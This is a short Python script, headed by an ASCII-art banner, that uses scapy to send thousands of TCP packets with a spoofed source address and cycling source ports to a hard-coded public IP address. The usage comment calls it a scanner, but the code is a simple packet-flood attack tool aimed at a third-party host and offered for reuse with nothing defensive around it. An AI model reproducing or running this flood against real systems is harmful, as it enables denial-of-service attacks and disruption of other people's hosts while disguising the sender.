##################################################
## / ___/ _ \|  _ \/ ___|| | | |_ _| \ | | ____|##
##| |  | | | | |_) \___ \| |_| || ||  \| |  _|  ##
##| |__| |_| |  _ < ___) |  _  || || |\  | |___ ##
## \____\___/|_| \_\____/|_| |_|___|_| \_|_____|##
##################################################

#Usage: change the ip that u wanna scan on the script below

from scapy.all import *
def floodz(source,target):
    for source_p in range(10000,15000):
        IPlayer = IP(src=source,dst=target)
        TCPlayer = TCP(sport=source_p,dport=600)
        pkt = IPlayer/TCPlayer
        send(pkt)
source = "127.0.0.1"

target = "103.147.154.37"

floodz(source,target)
